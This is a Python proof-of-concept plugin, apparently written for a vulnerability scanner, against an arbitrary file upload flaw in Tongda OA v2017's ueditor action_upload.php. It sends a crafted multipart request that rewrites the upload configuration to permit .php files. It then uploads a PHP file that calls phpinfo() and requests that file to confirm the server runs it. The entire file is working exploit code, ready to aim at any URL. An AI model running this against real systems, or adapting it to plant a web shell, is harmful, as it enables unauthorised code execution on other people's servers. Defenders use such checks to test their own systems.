#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/通达OA/通达OA v2017 action_upload.php 任意文件上传漏洞.html',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '通达OA v2017 action_upload.php 任意文件上传',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def hashmd5(s):
  import hashlib
  md5 = hashlib.md5()
  md5.update(str(s).encode('utf-8'))
  str_md5 = md5.hexdigest()
  return str_md5
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase

def run(url,ua):
  rand1 = randomLowercase(12)
  md5str = hashmd5(rand1)
  rboundary = randomLowercase(8)
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': f'multipart/form-data; boundary=----------WebKitFormBoundary{rboundary}'
      }
  target = '/module/ueditor/php/action_upload.php?action=uploadfile'
  data = f'''
-----------------------------{rboundary}
Content-Disposition: form-data; name="CONFIG[fileFieldName]"

ffff
-----------------------------{rboundary}
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"

1000000000
-----------------------------{rboundary}
Content-Disposition: form-data; name="CONFIG[filePathFormat]"

tcmd
-----------------------------{rboundary}
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"

.php
-----------------------------{rboundary}
Content-Disposition: form-data; name="ffff"; filename="{rand1}.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
-----------------------------{rboundary}
Content-Disposition: form-data; name="mufile"

submit
-----------------------------{rboundary}--

  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=10,verify=False)
    if res.status_code == 200:
      res.close()
  except:
    return ret
  try:
    resp = requests.get(url=url+f'/{rand1}.php',headers=headers,data=data,timeout=5,verify=False)
    if resp.status_code == 200 and 'phpinfo()' in resp.text:
      ret['ifbug'] = True
      # ret['huixian'] = res.text
      resp.close()
      return ret
    else:
      return ret
  except:
    return ret